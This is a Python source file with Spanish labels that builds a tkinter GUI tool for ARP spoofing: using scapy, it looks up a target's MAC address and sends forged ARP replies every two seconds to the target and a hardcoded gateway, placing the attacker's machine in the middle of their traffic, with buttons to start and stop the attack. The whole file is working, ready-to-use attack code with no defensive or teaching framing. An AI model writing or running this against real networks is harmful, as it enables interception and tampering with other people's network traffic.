import tkinter as tk
from tkinter import scrolledtext
from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid

ip_puerta_enlace = "192.168.223.97"

mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])


ataque_en_curso = False


def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc

def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la direcciÃ³n MAC del objetivo {ip_objetivo}.\n")
        return

    widget_salida.insert(tk.END, f"DirecciÃ³n MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
    
    try:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

        while ataque_en_curso:
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
            widget_salida.see(tk.END)
            time.sleep(2)
    except Exception as e:
        widget_salida.insert(tk.END, f"OcurriÃ³ un error: {e}\n")
        restaurar_conexion(ip_objetivo)

def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)

        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        print("ConexiÃ³n restaurada.")
    else:
        print("No se pudo restaurar la conexiÃ³n: no se pudieron obtener direcciones MAC.")

def iniciar_spoofing():
    global ataque_en_curso
    ip_objetivo = entrada_ip.get()
    if ip_objetivo:
        widget_salida.delete(1.0, tk.END)
        ataque_en_curso = True  
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, widget_salida), daemon=True)
        hilo.start()


def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)  

ventana = tk.Tk()
ventana.title("Herramienta de ARP Spoofing")

tk.Label(ventana, text="Ingrese la IP objetivo:").pack(pady=5)
entrada_ip = tk.Entry(ventana, width=30)
entrada_ip.pack(pady=5)

boton_iniciar = tk.Button(ventana, text="Iniciar ARP Spoofing", command=iniciar_spoofing)
boton_iniciar.pack(pady=10)

boton_detener = tk.Button(ventana, text="Cancelar ARP Spoofing", command=detener_spoofing)
boton_detener.pack(pady=10)

widget_salida = scrolledtext.ScrolledText(ventana, width=50, height=15)
widget_salida.pack(pady=5)

ventana.mainloop()